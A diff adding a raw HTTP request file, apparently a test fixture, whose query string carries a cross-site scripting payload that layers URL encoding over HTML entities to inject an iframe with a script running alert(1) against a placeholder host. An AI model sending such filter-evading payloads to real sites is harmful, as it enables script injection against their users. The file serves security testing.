@@ -1,0 +1,4 @@
+GET /a?q=%26%23x3C;iframe%20srcdoc%3D%26%23x22;%26%23x26;lt;script%26%23x26;gt;alert(1)%26%23x26;lt;/script%26%23x26;gt;%26%23x22;%26%23x3E; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
